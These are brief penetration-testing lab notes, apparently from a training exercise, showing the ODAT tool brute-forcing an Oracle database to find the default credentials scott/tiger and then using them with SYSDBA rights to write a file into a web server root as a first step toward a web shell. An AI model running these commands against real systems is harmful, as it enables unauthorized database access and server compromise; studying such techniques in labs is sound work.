```bash
# We use all to run all the built-in module in single scanning
./odat.py all -s 10.129.204.235
```
```bash
# Example Output
[!] Notice: 'mdsys' account is locked, so skipping this username for password  Notice: 'oracle_ocm' account is locked, so skipping this username for password [!] Notice: 'outln' account is locked, so skipping this username for password [+] Valid credentials found: scott/tiger. Continue...
```
- We found a valid credential of scot/tiger

## File Upload for Web Shell
```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```